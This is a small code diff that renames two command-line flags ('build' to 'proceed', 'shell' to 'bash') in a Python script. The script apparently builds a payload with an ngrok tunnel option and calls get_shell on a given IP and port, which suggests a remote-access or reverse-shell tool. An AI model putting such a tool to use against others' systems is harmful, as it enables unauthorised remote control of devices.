@@ -23,7 +23,7 @@ if float(platform.python_version()[:3]) < 3.6 and float(platform.python_version(
     sys.exit()
 
 
-if args.build:
+if args.proceed:
     port_ = args.port
     icon=True if args.icon else None
     if args.ngrok:
@@ -41,7 +41,7 @@ if args.build:
         else:
             print(stdOutput("error")+"\033[1mArguments Missing")
 
-if args.shell:
+if args.bash:
     if args.ip and args.port:
         get_shell(args.ip,args.port) 
     else:
